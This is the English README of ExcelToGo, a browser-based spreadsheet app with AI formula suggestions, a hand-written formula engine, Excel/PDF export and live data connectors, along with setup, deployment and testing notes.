# 📊 ExcelToGo — describe what you want, get an Excel formula that works

**Language:** [ไทย](README.md) · English

### ▶ [Try it — nothing to install](https://excel-to-go.vercel.app)

Runs in your browser; your data stays on your machine.
This site is the real app — free, no sign-up, not a trial — and you can [connect your own API from the browser](#from-your-browser-restcsv--works-on-this-site)
right here, with the URL, the header and the data never passing through our server.

> **Type "total sales for the northern branch" and get an Excel formula back**, with a sentence
> saying what it does — one click puts it in the cell. No remembering which argument SUMIF takes
> first. Or skip the typing: **pick from 37 ready-made formulas** and drag across the cells instead
> of typing addresses. It works out of the box with nothing to configure (a local keyword matcher,
> free), or paste your own Anthropic API key and the question goes to the real Claude — from your
> browser straight to Anthropic, never through this app's server.
>
> All of that happens on a `.xlsx` that **still looks like itself when it opens** (colour bands,
> merged cells, borders, row heights), computed by a **hand-written formula engine** (no
> third-party library), entirely in your browser — the data never leaves your machine, and there
> is no account to create.
>
> Four things build on that: **[your own API feeding the cells](#-live-data-from-an-api--csv-prototype)**, with no script to write —
> [straight from your browser on this site](#from-your-browser-restcsv--works-on-this-site), including APIs behind a VPN or in the office, or a database
> when you run the app yourself — keeping cells current on its own (following paginated APIs and backing off when rate-limited),
> **[imported files keeping their look](#-it-looks-like-the-file-you-opened)** (colour bands, large type,
> borders, merged cells), **[templates read straight out of an Excel file](#-templates-from-an-excel-file)**
> that already know which cells are yours to fill in, and **[Pivot summaries](#-pivot-summarise-a-range)**
> that group a range and write the result out as a new sheet.
>
> Charts exported with the `.xlsx` are **real charts you can keep editing in Excel**, not pictures —
> the OOXML chart part is written by hand, because ExcelJS cannot write one.

<p align="center">
  <img alt="Next.js" src="https://img.shields.io/badge/Next.js-16-000000?logo=next.js&logoColor=white">
  <img alt="React" src="https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=black">
  <img alt="TypeScript" src="https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript&logoColor=white">
  <img alt="Tailwind CSS" src="https://img.shields.io/badge/Tailwind_CSS-4-06B6D4?logo=tailwindcss&logoColor=white">
  <img alt="Zustand" src="https://img.shields.io/badge/Zustand-5-443E38">
  <a href="https://excel-to-go.vercel.app"><img alt="Open the app" src="https://img.shields.io/badge/▶_try_it-excel--to--go.vercel.app-2F9E44"></a>
  <img alt="Vitest" src="https://img.shields.io/badge/tests-1638%20passing-2F9E44?logo=vitest&logoColor=white">
  <img alt="CI" src="https://github.com/SuruchBoss/ExcelToGo/actions/workflows/ci.yml/badge.svg">
</p>

Describe what you want in plain Thai or English and get a working Excel formula back, with a sentence
explaining it; one click puts it in the cell. Out of the box that runs on a local keyword matcher — free,
nothing to configure — and pasting your own Anthropic API key sends the question to the real Claude, from your
browser straight to Anthropic, never through this app's server.

Beyond the assistant, a Next.js web app that turns an Excel-style grid into a friendlier UI: drag-and-drop ready-made formulas instead
of memorizing syntax, an AI assistant that suggests formulas from a natural-language question (Thai or English),
and a hand-written formula engine (tokenizer → parser → evaluator, no third-party formula library) supporting
cell/range references, relative & structural reference adjustment, circular-reference detection, multi-sheet
workbooks, named ranges (in Thai, substituted at compile time so the dependency graph stays honest), rules on
what a cell will accept that refuse a value rather than flag it afterwards, conditional formatting that
re-colours cells from their current values, pivot summaries over a selected range, live data from a REST/CSV
endpoint fetched by your own browser (on the public site, nothing to install, nothing through its server) or,
self-hosted, straight from PostgreSQL/MySQL — one saved read-only query, and nobody downstream ever sees SQL —
and full-fidelity Excel/PDF export, where a chart exported to `.xlsx` is a real, editable chart
bound to its cells, because the OOXML chart parts are written by hand (ExcelJS writes none). Plus optional
bring-your-own-backend cloud save and live co-editing over it — presence, last-writer-wins with the loser told, and
an undo that does not erase the other person's work. Bilingual UI (Thai/English), 1638 automated tests.

---

## ⏱️ Try it in 60 seconds

<p align="center"><img src="public/screenshots/en/demo.gif" width="900" alt="The three steps: change a price and the totals move, build a pivot, and the summary flags its source as stale"></p>

<p align="center"><sub>The three steps below, recorded from the running app — no edits</sub></p>

If you only have a minute — [**open the app**](https://excel-to-go.vercel.app/app), press **Try it with
sample data** on the green bar, and do these three things in order. Nothing to install, no sign-up.

The app opens on a **blank sheet**, because the first thing a person does is their own work, and a grid
already full of somebody else's coffee prices read as data left behind (it used to open on the sample,
and the first person to try it asked why the app had data left over). So the nine sample rows are one
press away, and every total in them is a **formula**, not a number. Undo takes the sample away again, and
**Start from a blank sheet** does too.

| | Do this | What you'll see |
|---|---|---|
| **1** | Click **C2** (the latte's price), type a different number, press Enter | The **Total** column and the **Grand total** row move with it — every total is a real formula, not a number somebody typed once |
| **2** | Select **A1:E10**, press **Summarise (Pivot)** → group by *Category* → value *Total* → **Build summary sheet** | A new sheet summarising by category. Go back and change a price, then watch the **"the source data has changed"** notice appear on the summary |
| **3** | Select **A1:E10** again and press **Export Excel** | Open it in real Excel — the formulas are still formulas, not baked-in values. Add a chart first and it exports as **a real chart you can keep editing** |

Want the harder parts: [embedding a Thai font in the PDF, with stacked tone marks](#-export) ·
[hand-written OOXML chart parts](#-charts-from-the-sheet) · [an accessibility gate in CI](#-testing) ·
[the formula engine](#-formula-engine)

> Every section explains the decision behind it, including **what it still can't do** — see
> [What's next](#-whats-next).

## 📸 Screenshots

<p align="center"><img src="public/screenshots/en/01-overview.png" width="900"></p>
<p align="center"><sub><b>Main screen</b> — the data grid with the drag-and-drop formula panel on the right</sub></p>

> The rest of the screenshots live in [**Features**](#-features) below, each one next to the feature it shows.
> Every shot is from a production build, not a mockup.

---

---

### 🧪 What 1638 passing tests could not catch

Every test of the assistant **mocks the model** — it returns what I imagined it would. Put a real
API key behind it, ask fourteen ordinary questions, and **six answers used functions this engine
does not have** (`TEXTJOIN`, `FIND`, `RANK.EQ`, `SUMPRODUCT`, `CEILING`, `CHAR`). All valid Excel;
all `#NAME?` in the cell, right after pressing a button labelled "insert".

Then **the first fix made it worse.** The rule started as "give the closest formula the list
allows", so _"join all the names into one line"_ came back as `=SUM(A2:A20)` — `0` in the cell, no
error, nothing to notice. **A visible `#NAME?` traded for an invisible wrong number.**

**And it happened again, in a different place.** With every gate green — 1638 tests, `axe` clean on
both pages at two widths — an hour of clicking through the public build the way a first-time visitor
would found three things no gate can see:

- Half-insert a formula from the palette and **all six sidebar buttons went dead.** They still set
  the mode in the store; a `pending ? … : mode` render just outranked it. Escape did nothing either,
  so the press arrived later, attached to whichever click finally cancelled the formula.
- The keyword matcher — which on the public site, with no key set, is not a fallback but the *only* thing anyone sees
  — answered _"add up all the sales"_ with `=SUM(E2)`, the total of one cell, and _"join the product
  name and the category"_ with `=SUM(E2)` again. The system prompt has forbidden the model from
  substituting like that since the fix above. Nothing had ever told the matcher.
- `axe` passed the grid at four viewport/page combinations while it was, to a screen reader, an
  ordinary table you could not drive: no `role="grid"`, no `aria-selected`, no `scope` on the
  headers, every cell tabbable, and **the browser's focus stayed on A1 while Ctrl+↓ moved the cursor
  to A10** — the sheet moved in silence. axe was right to pass. A `<table>` with `<th>` *is* a valid
  table. It just was not what this is.

All four are fixed. The lesson each time is the same one: a green suite says the code does what the
tests say, and nothing whatever about whether that is the right thing.

→ [The whole story, and the fix](#-ask-ai-for-a-formula) · repeatable with `npm run check:ai`

## 💼 Problems it solves

A summary for whoever decides whether to use it — told from **the problems a team already pays for**,
not from a feature list. Each one is solved by several features working together, and every feature
name links to its details below. It is the same content as the first section of the
[landing page](https://excel-to-go.vercel.app), which is laid out like a ledger: the cost in red ink,
the outcome under a double rule like a total.

<p align="center"><img src="public/screenshots/en/38-landing-problems.png" width="900" alt="The problems section on the landing page: an index of six problems, and the first one with its proof"></p>
<p align="center"><sub><b>On the landing page</b> — an index of six, then each one told as who has it → cost → solved by → outcome</sub></p>

### 01 · One person writes all the formulas

**Every report ends up waiting on the one person in the team who can write formulas**

- **Who has it:** Finance · sales admin · HR — teams who live in Excel but don't write formulas for a living
- **What it costs now:** Urgent reports queue behind one person, who becomes the whole department's bottleneck — and the day they change jobs, what the files knew leaves with them, because nobody else can read their formulas

**Solved by**

1. **[Ask the AI in plain Thai or English](#-ask-ai-for-a-formula)** — Type “total sales for the North branch only” and get a formula with an explanation before you decide to use it. Needs [your own API key](#-bring-your-own-api-key-byok) — without one, the app guesses from keywords and only manages basic formulas
2. **[37 ready-made formulas](#-drag-and-drop-formulas)** — Rather not type? Pick from the list, fill it in field by field, and press the crosshair to drag-select the range on the real sheet instead of typing cell addresses
3. **[Name ranges, in Thai if you like](#-named-ranges)** — `=SUM(ยอดขาย)` instead of `=SUM(B2:B500)` — whoever inherits the file can read the formula without chasing the person who wrote it

> **Outcome:** People in the team build their own reports the same day, and the file still makes sense after its author has moved on

### 02 · Numbers that are quietly wrong

**The total looked reasonable, went to management — and was wrong**

- **Who has it:** Anyone whose numbers someone else will make a decision on
- **What it costs now:** A formula whose range overruns by one column shows no error. Bad input surfaces at month-end close, and fixing it afterwards always costs more than stopping it at entry

**Solved by**

1. **[Restrict what can be entered](#-data-validation)** — A cell becomes a dropdown or accepts only numbers in a range. Anything outside the rule is **not saved** — refused, not stored and flagged later
2. **[See which cells a formula reads](#-see-what-a-formula-is-about)** — Click the total and the cells it reads light up on the sheet — a range one column too wide is visible at a glance
3. **[Pick ranges by dragging](#️-the-fill-handle)** — Drag on the sheet instead of typing addresses, and drag the corner to fill a whole column — references shift correctly, and `$A$1` stays put
4. **[Conditional formatting](#-conditional-formatting)** — Values out of the ordinary colour themselves, so nobody has to read every row

> **Outcome:** Bad data is stopped at the moment it is typed, not found at month-end close

### 03 · Re-pasting exports every month

**Every month someone exports figures from the back-office system and pastes them into the same file**

- **Who has it:** Teams whose data already lives in a sales system, an accounting system or a database, but whose reports are still made in Excel
- **What it costs now:** Export → paste → reformat, every month, and the numbers in the file are out of date the second the export finishes

**Solved by**

1. **[Connect an API from your browser](#from-your-browser-restcsv--works-on-this-site)** — Enter the URL and header once, right on this site; an API behind a VPN works too if your machine can reach it · for [PostgreSQL / MySQL directly](#-straight-into-a-database-postgresql--mysql), run the app on your own server. Queries run read-only, and the database itself refuses writes
2. **[Press “Insert into sheet”](#-live-data-from-an-api--csv-prototype)** — Users pick a cell and choose the whole table or one summary figure. Values refresh on a schedule and feed formulas like any other cell
3. **[Pivots and charts that follow the data](#-pivot-summarise-a-range)** — A summary tied to its source refreshes with one press, and [charts](#-charts-from-the-sheet) move the moment the numbers do

> **Outcome:** One monthly chore is gone, and the number in the file is the number right now

### 04 · Existing files break on the way in

**You'd switch tools, but your Excel files open broken, and Thai PDFs come out with floating vowels**

- **Who has it:** Teams with templates they've used for years, who send files on to customers or agencies that use Excel
- **What it costs now:** Templates have to be rebuilt, exported files turn into dead numbers the recipient can't work with, and a Thai PDF with misplaced tone marks can't go to a customer

**Solved by**

1. **[Open .xlsx files as they were](#-it-looks-like-the-file-you-opened)** — Fills, borders, font sizes, row heights and merged cells all come across
2. **[Templates from locked files](#-templates-from-an-excel-file)** — A protected workbook is read as a template that knows which cells are for input and which must not be touched, dropdowns included
3. **[Exports you can keep working on](#-export)** — Formulas stay formulas, charts are real Excel charts, and [CSV exports](#-csv-in-and-out) neutralise formulas smuggled in with the data (CSV injection)
4. **[Thai PDFs that read correctly](#-export)** — The Thai font is embedded, and tone marks stacked over upper vowels land in the right place

> **Outcome:** No existing file left behind, and whatever you send out opens in Excel ready to keep working on

### 05 · Customer data can't be uploaded

**Payroll or a customer list can't be uploaded to someone else's service**

- **Who has it:** Work involving personal data, where IT or legal have to be able to say where the data goes
- **What it costs now:** Every more convenient tool wants a login and an upload, so the request ends at “not approved” — or worse, someone uses it anyway and nobody knows

**Solved by**

1. **[Runs entirely in the browser](#-security--what-was-actually-tested)** — No account, no upload, the file never leaves the machine, and the page's security policy (CSP) closes the route for data to be sent anywhere else — an e2e flow fires at it for real
2. **[AI on your own key](#-bring-your-own-api-key-byok)** — Questions go from the browser straight to Anthropic on your key, never through this site's server — only the question, the selected range and the column headers, never the file
3. **[Usage counted without identifying anyone](#-a-usage-count-that-provably-cannot-identify-anyone)** — It can tell how many times the app was opened today, nothing more: no IP, no cookie, and Do Not Track is honoured · error reports (if switched on) strip Thai text and keys before they leave
4. **[Cloud on your own backend](#️-cloud-save-bring-your-own-backend)** — Want to save online or edit together? Connect your own Supabase project — and its row-level access rules are under test

> **Outcome:** Start using it without waiting for anyone's approval, and answer “where does the data go?” with code anyone can read, not with a policy page

### 06 · Work lost halfway through

**An afternoon of typing, gone — the connection dropped, the tab froze, or someone saved over it**

- **Who has it:** Everyone — especially people working away from the office, or several people editing one file
- **What it costs now:** Hours of work gone in one click, and `final_v3_fixed.xlsx` passed around until nobody knows which copy is current

**Solved by**

1. **[Autosave, and undo](#-autosave--undoredo)** — Every edit is kept in the browser as you make it, and Ctrl+Z steps back one change at a time
2. **[A save that fails says so](#-autosave--undoredo)** — If the browser refuses a save — storage full, for instance — the app shows an alert straight away and export still works, instead of saying nothing until the tab closes
3. **[Crashes still let the work out](#-the-app-can-break-and-you-still-get-your-file-out)** — If the app crashes, the screen that appears offers the work as a file before anything else, and the app [opens even with no connection](#-opens-with-the-network-off)
4. **[Edit together, with version history](#-editing-together)** — Several people edit one file live, your undo never erases theirs, and earlier versions can be restored (on your own Supabase project)

> **Outcome:** Nothing you've typed disappears quietly, and there is one copy of the file that everyone works on

<p align="center"><img src="public/screenshots/en/42-save-failed.png" width="820" alt="The browser refuses a save: the app raises a red alert at once, with an Export Excel button"></p>
<p align="center"><sub><b>A refused save</b> — the alert appears the moment the browser says no, with export right in it</sub></p>

---

## 📋 Table of Contents

- [Try it in 60 seconds](#️-try-it-in-60-seconds)
- [Screenshots](#-screenshots)
- [Problems it solves](#-problems-it-solves)
- [Why this project](#-why-this-project)
- [Getting started](#-getting-started)
- [Features](#-features)
  - [Ask AI for a formula](#-ask-ai-for-a-formula)
  - [Bring your own API key (BYOK)](#-bring-your-own-api-key-byok)
  - [Live data from an API / CSV (prototype)](#-live-data-from-an-api--csv-prototype)
  - [Straight into a database (PostgreSQL / MySQL)](#-straight-into-a-database-postgresql--mysql)
  - [Connect your own data: the in-app guide](#-connect-your-own-data-the-in-app-guide)
  - [Spreadsheet grid](#-spreadsheet-grid)
  - [Autosave + Undo/Redo](#-autosave--undoredo)
  - [The app can break and you still get your file out](#-the-app-can-break-and-you-still-get-your-file-out)
  - [Copy / Cut / Paste](#️-copy--cut--paste)
  - [Cell formatting](#-cell-formatting)
  - [Fill colour](#-fill-colour)
  - [Phone numbers and codes keep their zeros](#-phone-numbers-and-codes-keep-their-zeros)
  - [Dates and times](#-dates-and-times)
  - [Charts from the sheet](#-charts-from-the-sheet)
  - [Conditional formatting](#-conditional-formatting)
  - [Cell comments](#-cell-comments)
  - [Data validation](#-data-validation)
  - [Named ranges](#-named-ranges)
  - [Cloud save (bring your own backend)](#️-cloud-save-bring-your-own-backend)
  - [Editing together](#-editing-together)
  - [The Excel keyboard](#️-the-excel-keyboard)
  - [Formulas that answer with a whole table (array formulas)](#-formulas-that-answer-with-a-whole-table-array-formulas)
  - [Formulas across sheets](#-formulas-across-sheets)
  - [See what a formula is about](#-see-what-a-formula-is-about)
  - [The fill handle](#️-the-fill-handle)
  - [Find and replace](#-find-and-replace)
  - [Opens with the network off](#-opens-with-the-network-off)
  - [Works on a phone](#-works-on-a-phone)
  - [Copy, paste and fill down with a finger](#-copy-paste-and-fill-down-with-a-finger)
  - [Tablets and folding phones](#-tablets-and-folding-phones)
  - [Insert/delete rows & columns](#-insertdelete-rows--columns)
  - [Merging cells](#-merging-cells)
  - [Sort and filter](#-sort-and-filter)
  - [Pivot (summarise a range)](#-pivot-summarise-a-range)
  - [Multiple sheets in one file](#-multiple-sheets-in-one-file)
  - [Import an existing Excel file](#-import-an-existing-excel-file)
  - [Opening a file without losing your work](#-opening-a-file-without-losing-your-work)
  - [A blank start, and New file](#-a-blank-start-and-new-file)
  - [Drag-and-drop formulas](#-drag-and-drop-formulas)
  - [Export](#-export)
  - [CSV in and out](#-csv-in-and-out)
  - [It looks like the file you opened](#-it-looks-like-the-file-you-opened)
  - [Templates from an Excel file](#-templates-from-an-excel-file)
  - [A usage count that provably cannot identify anyone](#-a-usage-count-that-provably-cannot-identify-anyone)
  - [A landing page that explains the app](#-a-landing-page-that-explains-the-app)
  - [Bilingual (Thai / English)](#-bilingual-thai--english)
- [Tech stack](#-tech-stack)
- [Architecture](#-architecture)
- [Project structure](#-project-structure)
- [Formula engine](#-formula-engine)
- [Bilingual UI (i18n)](#-bilingual-ui-i18n)
- [Security — what was actually tested](#-security--what-was-actually-tested)
- [Lighthouse](#-lighthouse)
- [Testing](#-testing)
- [What's next](#-whats-next)

---

## 🎯 Why this project

The starting point was a real pain point using Excel: **hard to fill in on desktop/online, an unfriendly UI,
formulas nobody remembers, and getting lost scrolling a big sheet.** This project sets out to fix that directly
rather than build a generic "calculator app," which means dealing with more subtlety than it first looks:

- Users should be able to type formulas themselves **or** drag one in without knowing any syntax — both paths
  have to work equally well.
- Formulas must shift references correctly both when copied/filled down a column (relative) **and** when a row
  or column is inserted/deleted (structural) — two genuinely different algorithms. Get either wrong and the
  sheet silently computes the wrong number.
- Formulas can reference each other in a circle; that has to be detected, not hang the app.
- Every edit (typing a value, inserting a formula, formatting) needs undo/redo, but moving the selection or
  switching sheet tabs must **not** count as history — otherwise one Ctrl+Z would just undo where the cursor
  was, not the actual content change.
- Importing/exporting Excel files has to preserve **the original formulas and formatting** (bold/color/alignment),
  not just the computed numbers.
- It should work for both Thai and English speakers without needing locale-based routing (`/en/...`), since the
  app is entirely client-rendered.

The project's focus is therefore **correctness of the calculation logic + an architecture that's maintainable**,
rather than a long feature list with shallow depth — see [Formula engine](#-formula-engine) for the deep dive.

---

## 🚀 Getting started

> About 2 minutes · no database or separate backend needed — everything runs in one Next.js app

### Step 0 — Get the code

```bash
git clone https://github.com/SuruchBoss/ExcelToGo.git
cd ExcelToGo
```

### Step 1 — Install and run

**Requires:** [Node.js](https://nodejs.org) **22.12+ or 24** and npm. The 22.12 floor comes from Vite 7,
which the test suite runs on and which needs `require(esm)`; `@supabase/supabase-js` wants Node 22 anyway.
`package.json` declares `^22.12.0 || ^24.0.0` in `engines`, exactly the two versions CI runs. **Node 20 is no
longer supported**: it went out of support (no more security fixes) on 2026-04-30

```bash
npm install
npm run dev
```

Open **http://localhost:3000** and you land on a page explaining what the app does. Click
**"Open the app"** to get to the real thing, or go straight to **http://localhost:3000/app**.

| Route | What it is |
|---|---|
| `/` | The landing page — features with screenshots from the running app, bilingual like the app itself |
| `/app` | The app itself, opening on a sample sheet with nothing to configure |

(The sample data is a coffee/bread/milk receipt with real total formulas. Click **ExcelToGo** in the
app's top-left corner to get back to the landing page.)


Other available commands:

| Command | What it does |
|---|---|
| `npm run dev` | Development mode (hot reload) |
| `npm run build` | Build a production bundle |
| `npm run start` | Run the production build (run `npm run build` first) |
| `npm run lint` | Check code quality with ESLint |
| `npm test` | Run the 1638-case Vitest suite |
| `npm run check:readme` | Check the READMEs still match the code (links/images/test count/new modules/both languages) |
| `npm run check:screens` | Figures printed on a screenshot still match the source |
| `npm run check:rls` | Two real accounts against your own Supabase: does the database refuse what the policies say it should (needs env) |
| `npm run check:deps` | Every advisory is fixed, or written down with a reason and a review date |
| `npm run check:bundle` | Size budgets, and the cloud client staying in a chunk of its own (needs a build) |
| `npm run check:mutants` | Breaks the engine on purpose and checks the suite notices — 32/32 (no build needed) |
| `npm run check:a11y` | axe on both pages at 390px and 1280px, plus sideways-scroll checks (needs a build) · `A11Y_WIDTH=390` runs one half, which is how CI runs it |
| `npm run check:e2e` | Drives the real app through 23 flows: opening blank with a sample left in the browser not coming back, New file asking first and undoing, formulas, `.xlsx` round trip, an import on top of work that asks first, keyboard only, undo, editing after undoing a new sheet, a cut across sheets, a formula bar that never writes a stale value, announcements, the AI assistant, the CSP, an API connected from the browser (nothing reaching `/api/*`), an API without CORS getting the IT checklist, no page calling itself a demo, the phone tab bar, cross-sheet values on screen after a PDF export, a sort and undo (needs a build · `E2E_ONLY=<part of a name>` runs just the matching flows while editing) |
| `npm run check:ai` | Asks the real Claude with your own key and checks the formulas against what this engine can evaluate — not in `verify`, because it needs a key and costs money |
| `npm run verify` | Everything, before a push: lint → check:readme → check:screens → check:deps → test → check:mutants → build → check:bundle → check:a11y → check:e2e (~5 min) |
| `npm run verify:quick` | The same gates minus `check:mutants`, `check:a11y`, `check:e2e` and `check:deps` — **37 seconds**, for the loop while writing. Not a substitute for `verify` before a push |
| `npm run build:social` | Re-render `public/social-preview.png` (1280×640), counting the card's figures from source |
| `npm run screenshots -- --lang all` | Retake every screenshot from a production build, in both languages (Thai → `public/screenshots/`, English → `public/screenshots/en/`) · `--only 05,20` for some · `--no-build` to reuse the current build |

### Step 2 — Connect the AI assistant to real Claude (optional)

By default the AI assistant suggests formulas via **local keyword matching** (works immediately, no setup, but
understands a limited range of phrasing). To let it understand natural-language questions more flexibly,
connect it to the Claude API:

```bash
cp .env.example .env.local
```

Open `.env.local` and set:

```
ANTHROPIC_API_KEY=sk-ant-xxxxxxxxxxxxxxxxxxxxx
```

(get a key at [console.anthropic.com](https://console.anthropic.com)) then restart `npm run dev` — the app
switches to Claude automatically once this is set, no code changes needed.

### Step 3 — Deploy for real

This is a standard Next.js app, so it deploys to any platform that supports Next.js:

- **[Vercel](https://vercel.com)** (recommended, easiest): connect this repo to Vercel and deploy. For real
  AI, add an `ANTHROPIC_API_KEY` environment variable under Project Settings → Environment Variables.
  — **if that deployment is open to the public, read the box below first**, because the key will be used for everyone who visits.

  **Functions are pinned to `sin1` (Singapore) in [`vercel.json`](vercel.json).** Vercel's default is `iad1`
  (Washington), while both the users and the Supabase database are in Southeast Asia, so every request
  crossed the Pacific and back before doing any work — and `/` and `/app` are both dynamic, so that was every
  page load. The known trade-off: `/api/ai/formula` talks to Anthropic's API in the US, so the long leg moves
  from user→function to function→Anthropic; it comes out about even, and the model's thinking time dwarfs
  the trip either way. The Hobby plan allows one region; change it if you deploy for users elsewhere.
  **Do not reach for `export const preferredRegion` in a route file instead** — in this Next.js version it is
  deprecated, and on Vercel it accepts only `'auto'`, `'global'` or `'home'`, so `'sin1'` fails the build.

  **Server-side live data on serverless has a size limit.** Vercel will not send a function response over 4.5 MB (it
  answers 413 instead), so the app sends at most 4 MB of live-data table to the browser per refresh. A
  bigger table arrives with the rows that fit and a warning that it is partial — about 41,800 rows of the
  sample feed's shape, about 7,700 of twenty Thai text fields, against the 50,000 the form allows. **Self-hosted
  has no 4.5 MB limit**, but the app uses the same 4 MB so one source behaves the same in both places; to
  allow more on your own server, change `MAX_DELIVERED_BYTES` in `src/lib/dataSources/fetchLimits.ts`,
  the one place it is set. Live data connected from the browser does not pass through a function, so this
  4 MB does not apply to it (the same byte and time budget per refresh still does).
- Self-host with Docker/any Node server: `npm run build` then `npm run start`.

> [!IMPORTANT]
> **Before opening a deployment to the public — two variables that, once set, everyone on the site uses too**
>
> **`ANTHROPIC_API_KEY`: set on a public deployment, everyone who uses the site uses AI on the deployment
> owner's key and bill.** `/api/ai/formula` uses the server's key whenever one is set (the same as on your own
> machine) and takes no authentication by design — the assistant is part of the app, and making a visitor log in
> to ask a question would be absurd. It is capped at **20 calls a minute per IP**, which slows a careless script,
> but the IP is read from `x-forwarded-for`, which a client can set to anything — a script that changes it on
> every call is never limited — and the counters live in the process's memory: separate instances count
> separately and a serverless cold start forgets them. **That guards against casual abuse, it is not a billing
> control.**
>
> The one billing control is **not setting the key on a public deployment.** The local keyword matcher answers
> instead, for free, and visitors can still bring [their own key](#-bring-your-own-api-key-byok), which goes from
> their browser straight to Anthropic and never touches this route. That is how this project's public site is meant to run ·
> `NEXT_PUBLIC_DEMO_MODE=1` used to make the route skip Anthropic even with a key set — **it no longer does**
> (#109), and [`route.test.ts`](src/app/api/ai/formula/route.test.ts) pins that the old switch no longer hides a
> configured key.
>
> **`SOURCES_ADMIN_TOKEN`: switches on server-side sources.** With it set, the live-data panel shows a token box,
> and whoever holds the token can have the server fetch a URL or open a database (behind the SSRF guard — see
> [`SECURITY.md`](SECURITY.md)). Unset, that part of the UI does not exist and every `/api/sources*` route
> refuses. Connecting an API from the browser works for everyone with nothing set · server-side sources write to
> `data/sources.json`, which a serverless host like Vercel cannot write anyway.
>
> **`NEXT_PUBLIC_DEMO_MODE`** is still read for older deployments and now means exactly one thing: server-side
> sources off, even with a token. It has no effect on the assistant and shows users nothing.
>
> **Order when deploying this version and removing `NEXT_PUBLIC_DEMO_MODE` from Vercel:** the owner first
> confirms that **neither `ANTHROPIC_API_KEY` nor `SOURCES_ADMIN_TOKEN` is set** on the public deployment. That
> variable used to be what made a leftover key or token harmless; now a key takes effect the moment this version
> deploys, and a token the moment the variable is removed.

### 🔧 Troubleshooting

<details>
<summary><b>Click to expand</b></summary>

| Symptom | Cause | Fix |
|---|---|---|
| `Error: listen EADDRINUSE :::3000` | Something else is using port 3000 | Run on another port: `PORT=3001 npm run dev` |
| Importing an Excel file errors out | Corrupted file, password-protected, or a very old `.xls` | Open it in Excel and "Save As" `.xlsx` first, then import that |
| AI assistant only gives basic suggestions that don't match the question | `ANTHROPIC_API_KEY` isn't set yet (using the keyword heuristic instead) | Set the API key per [Step 2](#step-2--connect-the-ai-assistant-to-real-claude-optional) |
| A cell shows `#CIRCULAR!` after inserting a formula | The formula indirectly references itself (e.g. A1 references B1, B1 references A1) | Rewrite the formula so it doesn't loop back on itself |
| A red bar says the workbook is too big for this browser | The workbook is past the `localStorage` quota (~5 MB), or the browser has saving switched off. Everything is still there in this tab, but a close or refresh will lose it | Press **"Export Excel"** in that bar. It goes away by itself once a save lands again |
| Data disappears after a refresh or on another device | Data autosaves to that browser/device's `localStorage` only — it doesn't sync across devices | Click **"Export Excel"** to get a file you can keep, then re-import it elsewhere |
| Ctrl+Z does nothing | Focus is still inside a text field (editing a cell, or the AI question box) | Press Enter/Escape to leave the field first, or use the ↶ toolbar button instead |

</details>

---

## ✨ Features

### 🤖 Ask AI for a formula

Type what you want as a plain sentence, in Thai or English — e.g. _"I want to total all sales in this column."_
The app sends your question plus the currently selected range to the AI and gets back a suggested formula with
a short explanation. One click inserts it into the selected cell.

<p align="center"><img src="public/screenshots/en/04-ai-assistant.png" width="820"></p>

**The panel now runs in the order it is used** — question, ask, examples, answer. The box for your own API key
moved to **the end of the panel, folded** (it opens itself when a key is already saved), because in the blind
test it sat at the top and was read as "you need a key before this works", which you do not · An answer from
the **keyword matcher** carries a "Keyword guess" chip and an outlined insert button rather than the green
primary one — a guess should not look like an answer · If the target cell **already holds something**, the
panel says which cell will be overwritten before you press (it can be undone) · The answer scrolls itself into
view instead of appearing somewhere below the fold.

**What only a real key could show.** Every test of this feature mocks Anthropic — which means it
returns whatever the test author imagined it would. Put a real API key behind it and ask fourteen
ordinary questions, and **six answers used functions this engine does not have** (`TEXTJOIN`,
`FIND`, `RANK.EQ`, `SUMPRODUCT`, `CEILING`, `CHAR`). All valid Excel; all `#NAME?` in the cell,
after the user pressed a button labelled "insert". **43% of the feature the landing page leads
with.**

Fixed on both sides:

1. **The ten missing functions are in the engine now**, because real questions reached for them —
   see [supported functions](#supported-functions).
2. **The model is told what exists here**, from a list generated out of `FUNCTIONS` rather than
   written by hand: a second copy is the one that goes stale, and here the stale copy would be the
   one telling the model what it may use.

**The first attempt at that made things worse**, which is the part worth keeping. The rule started
as "give the closest formula the list allows", so _"join all the names into one line"_ came back as
`=SUM(A2:A20)` — `0` in the cell, no error, nothing to notice. **A visible `#NAME?` had been traded
for an invisible wrong number.** The rule now forbids substituting an unrelated function and asks
for a warning instead.

**Then the same mistake turned up in the matcher that answers when there is no key** — which, on the
public site (no key set), is not a fallback but the only thing anyone ever sees. Two failures, both found by
using the app rather than by testing it:

- Every unmatched question fell through to `SUM`. _"Join the product name and the category"_ came
  back as `=SUM(E2)`. The prompt had forbidden the model from doing this; nobody had told the code.
  It now returns **no formula at all** and says so in an amber card with no Insert button. A
  question it cannot answer is a better outcome than an answer it cannot justify.
- The range was whatever cell you had highlighted, so _"add up all the sales"_ with one cell
  selected meant `=SUM(E2)` — the total of one number. `aiRange.ts` now works out what the cursor is
  *pointing at*, the way AutoSum has since 1985: the run of filled cells it stands in or sits under,
  minus a text header on top of numbers. On this app's own sample sheet that turns the same question
  into `=SUM(E2:E10)`, which is 7,495. The headers go along with it too — the API route had accepted
  a `headers` field since the feature shipped and no caller had ever filled it in.

One subtlety worth its own note: the widening reads the **computed** sheet, not the raw one. Column E
of the sample is nine `=C2*D2` formulas, so reading the raw cells made every number in it look like
text, the header rule never fired, and the range came back as `E1:E10` with the word "รวม" inside.
`SUM` ignores text, so the *total was right and the range was wrong* — the kind of bug that survives
because the number on screen looks fine.

Repeatable with `npm run check:ai` (needs your own key; not part of `npm run verify`, because it
costs money).

### 🔑 Bring your own API key (BYOK)

The assistant answers one of three ways, and the landing page says plainly which ones the public site uses (the keyword matcher, or your own key):

| Path | When | Answer comes from | Who pays |
|---|---|---|---|
| Local keyword matcher | The default | `aiHeuristic.ts` — matches words; **declines when nothing matches** | Nobody |
| **The real Claude (BYOK)** | The visitor pastes their own API key | `api.anthropic.com`, straight from the browser | **The visitor's own account** |
| The real Claude (server-side) | The operator sets `ANTHROPIC_API_KEY` | `/api/ai/formula` | Whoever runs the server — **for everyone who uses that deployment** ([see the warning](#step-3--deploy-for-real)) |

<p align="center"><img src="public/screenshots/en/33-byok.png" width="560"></p>

**The key never passes through this app's server.** The request goes from the browser straight to
`api.anthropic.com` — that is what the SDK's `dangerouslyAllowBrowser` unlocks (it adds the
`anthropic-dangerous-direct-browser-access` header Anthropic's CORS policy requires). A key POSTed to
our own route would sit in that process's memory and in whatever the host logs; this way there is
nothing to leak, because there is nothing here to leak.

